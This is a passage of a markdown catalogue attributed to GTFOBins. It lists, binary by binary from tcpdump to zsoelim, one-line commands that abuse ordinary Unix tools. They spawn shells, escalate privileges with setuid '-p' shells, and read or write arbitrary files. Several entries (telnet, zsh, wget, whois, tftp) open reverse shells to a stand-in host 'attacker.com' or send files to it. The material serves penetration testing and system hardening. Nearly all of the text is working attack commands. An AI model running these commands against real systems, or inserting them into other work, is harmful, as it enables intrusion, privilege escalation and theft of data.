This saves the packet dump (count is 1) from the loopback interface to a file. To trigger the capture use something like:

```
nc -u localhost 1 <<<DATA
```

While `user` is the owner of the packet dump file, the invoking user must be able to capture traffic on the device.

```bash
tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user
```

### tcsh

**file-write** — writes to an arbitrary file

```bash
tcsh -bc 'echo DATA >/path/to/output-file'
```

**shell** — spawns an interactive shell

```bash
tcsh -b
```

### tdbtool

**shell** — spawns an interactive shell

```bash
tdbtool
! /bin/sh
```

### tee

**file-write** — writes to an arbitrary file

Use `-a` to append data to exising files.

```bash
echo DATA | tee /path/to/output-file
```

### telnet

**reverse-shell** — connects back to a listener you control

The shell process is not spawn by `openssl`.

```bash
mkfifo /path/to/temp-socket
telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
```

**shell** — spawns an interactive shell

```bash
telnet
!/bin/sh
```

### terraform

**file-read** — reads an arbitrary file

```bash
terraform console
file("/path/to/input-file")
```

### tex

**shell** — spawns an interactive shell

```bash
tex --shell-escape '\immediate\write18{/bin/sh}'
```

### tftp

**download** — download

```bash
tftp attacker.com
get /path/to/input-file
```

**upload** — upload

```bash
tftp attacker.com
put /path/to/input-file
```

### tic

**file-read** — reads an arbitrary file

This translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure.

```bash
tic -C /path/to/input-file
```

### time

**shell** — spawns an interactive shell

Note that the shell might have its own builtin `time` implementation, which may behave differently than the binary, which is often located at `/usr/bin/time`.

```bash
time /bin/sh -p
```

### timeout

**shell** — spawns an interactive shell

```bash
timeout 0 /bin/sh -p
```

### tmate

**shell** — spawns an interactive shell

```bash
tmate -c /bin/sh
```

### tmux

**file-read** — reads an arbitrary file

The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.

```bash
tmux -f /path/to/input-file
```

**shell** — spawns an interactive shell

```bash
tmux -c /bin/sh
```

**shell** — spawns an interactive shell

Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`).

```bash
tmux -S /path/to/socket
```

### troff

**file-read** — reads an arbitrary file

The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.

```bash
troff /path/to/input-file
```

### ul

**file-read** — reads an arbitrary file

The read file content is corrupted by replacing occurrences of `$'\b_'` to terminal sequences and by converting tabs to spaces.

```bash
ul /path/to/input-file
```

### unexpand

**file-read** — reads an arbitrary file

Convert sequences of (e.g., `999`) spaces to tab.

```bash
unexpand -t999 /path/to/input-file
```

### uniq

**file-read** — reads an arbitrary file

The read file content is corrupted by squashing multiple adjacent lines.

```bash
uniq /path/to/input-file
```

### unshare

**shell** — spawns an interactive shell

```bash
unshare -r /bin/sh
```

### unsquashfs

**privilege-escalation** — privilege-escalation

```bash
unsquashfs shell
./squashfs-root/sh -p
```

### unzip

**privilege-escalation** — privilege-escalation

```bash
unzip -K shell.zip
./sh -p
```

### update-alternatives

**file-write** — writes to an arbitrary file

Write in `/path/to/output-file` a symlink to `/path/to/temp-file`.

```bash
echo DATA >/path/to/temp-file
update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0
```

### urlget

**file-read** — reads an arbitrary file

This is part of `gettext` and usually not in `PATH`, e.g., on Arch it can be found at `/usr/lib/gettext/urlget`.

```bash
urlget - /path/to/input-file
```

### uuencode

**file-read** — reads an arbitrary file

```bash
uuencode /path/to/input-file /dev/stdout | uudecode
```

### varnishncsa

**file-write** — writes to an arbitrary file

The command hangs, so the trigger command must be performed asynchronously or in another terminal:

```
curl -H 'xxx: DATA' http://localhost:6081/xxxxxxxxxx
```

```bash
varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
```

### vi

**file-read** — reads an arbitrary file

```bash
vi /path/to/input-file
```

**file-write** — writes to an arbitrary file

Where `^[` is the escape key.

```bash
vi /path/to/output-file
iDATA
^[
w
```

**shell** — spawns an interactive shell

```bash
vi -c ':!/bin/sh' /dev/null
```

**shell** — spawns an interactive shell

```bash
vi -c ':shell'
```

**shell** — spawns an interactive shell

```bash
vi -c ':set shell=/bin/sh\ -p | shell'
```

**shell** — spawns an interactive shell

```bash
vi -c ':terminal /bin/sh -p'
```

### vigr

**inherit** — inherit

Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.

```bash
vigr
```

### vim

**file-read** — reads an arbitrary file

```bash
vim -c ':redir! >/path/to/output-file | echo "DATA" | redir END | q'
```

**inherit** — inherit

This allows to run Python code (`...`).

```bash
vim -c ':py ...'
```

**inherit** — inherit

This allows to run Lua code (`...`).

```bash
vim -c ':lua ...'
```

**inherit** — inherit

```bash
vim
```

### vipw

**inherit** — inherit

Despite requiring superuser privileges to run, the editor is executed as the unprivileged user.

```bash
vipw
```

### volatility

**inherit** — inherit

```bash
volatility -f /path/to/core-dump volshell
...
```

### w3m

**file-read** — reads an arbitrary file

```bash
w3m -dump /path/to/input-file
```

### watch

**shell** — spawns an interactive shell

```bash
watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'
```

**shell** — spawns an interactive shell

```bash
watch 'reset; exec /bin/sh 1>&0 2>&0'
```

### wc

**file-read** — reads an arbitrary file

The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message.

```bash
wc --files0-from /path/to/input-file
```

### wget

**download** — download

```bash
wget http://attacker.com/path/to/input-file -O /path/to/output-file
```

**file-read** — reads an arbitrary file

The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.

```bash
wget -i /path/to/input-file
```

**file-write** — writes to an arbitrary file

The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.

```bash
wget -i /path/to/input-file -o /path/to/output-file
```

**shell** — spawns an interactive shell

```bash
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```

**upload** — upload

```bash
wget --post-file=/path/to/input-file http://attacker.com
```

**upload** — upload

```bash
wget --post-data=DATA http://attacker.com
```

### whiptail

**file-read** — reads an arbitrary file

The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.

```bash
whiptail --textbox --scrolltext /path/to/input-file 0 0
```

### whois

**download** — download

Received data has instances of the `\r` byte stripped.

```bash
whois -h attacker.com -p 12345 x
```

**upload** — upload

Data is converted to lower case, and has a trailing `\r\n`.

```bash
whois -h attacker.com -p 12345 DATA
```

### wish

**inherit** — inherit

```bash
wish
```

### xargs

**file-read** — reads an arbitrary file

```bash
xargs -a /path/to/input-file -0
```

**shell** — spawns an interactive shell

```bash
xargs -a /dev/null /bin/sh -p
```

**shell** — spawns an interactive shell

```bash
xargs -a /dev/null /bin/sh -p
```

**shell** — spawns an interactive shell

```bash
echo x | xargs -o -a /dev/null /bin/sh -p
```

### xdotool

**shell** — spawns an interactive shell

```bash
xdotool exec --sync /bin/sh -p
```

### xmodmap

**file-read** — reads an arbitrary file

The read file content is corrupted by error prints.

```bash
xmodmap -v /path/to/input-file
```

### xmore

**file-read** — reads an arbitrary file

The file is displayed in a graphical window.

```bash
xmore /path/to/input-file
```

### xpad

**file-read** — reads an arbitrary file

The file is displayed in a graphical window.

```bash
xpad -f /path/to/input-file
```

### xxd

**file-read** — reads an arbitrary file

```bash
xxd /path/to/input-file | xxd -r
```

**file-write** — writes to an arbitrary file

```bash
echo DATA | xxd | xxd -r - /path/to/output-file
```

### xz

**file-read** — reads an arbitrary file

```bash
xz -c /path/to/input-file | xz -d
```

### yash

**shell** — spawns an interactive shell

```bash
yash
```

### zic

**command** — runs a single command

This executes the command twice:

- `/path/to/command 0 xxx`
- `/path/to/command 1 xxx`

Additionally the `Test` file is created.

```bash
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file
```

### zip

**file-read** — reads an arbitrary file

```bash
zip /path/to/temp-file /path/to/input-file
unzip -p /path/to/temp-file
```

**shell** — spawns an interactive shell

```bash
zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
```

### zless

**inherit** — inherit

```bash
zless /path/to/input-file
```

### zsh

**download** — download

```bash
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
```

**file-read** — reads an arbitrary file

```bash
zsh -c 'echo "$(</path/to/input-file)"'
```

**file-read** — reads an arbitrary file

This spawns a pager if run in a TTY.

```bash
zsh -c '</path/to/input-file'
```

**file-write** — writes to an arbitrary file

```bash
zsh -c 'echo DATA >/path/to/output-file'
```

**inherit** — inherit

```bash
zsh -c '</etc/hosts'
```

**reverse-shell** — connects back to a listener you control

```bash
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

**shell** — spawns an interactive shell

```bash
zsh
```

**upload** — upload

```bash
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
```

### zsoelim

**file-read** — reads an arbitrary file

The content is actually parsed and corrupted by the command.

```bash
zsoelim /path/to/input-file
```

## Attribution

Data from [GTFOBins](https://gtfobins.github.io/) (commit `acd524623f9c`), licensed GPL-3.0. Vendored at `vendor/GTFOBins/_gtfobins/`.
